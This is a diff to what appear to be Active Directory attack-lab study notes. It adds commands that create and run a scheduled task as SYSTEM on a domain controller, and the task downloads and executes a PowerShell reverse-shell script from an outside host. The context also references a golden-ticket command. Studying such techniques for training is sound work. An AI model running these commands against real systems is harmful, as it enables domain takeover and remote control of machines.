@@ -13,6 +13,14 @@ BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.mo
 
 ![[Pasted image 20231215170859.png]]
 
+#### Schedule and execute a task - noisy
+```powershell
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
+```
+```powershell
+schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+```
+
 
 
 ---
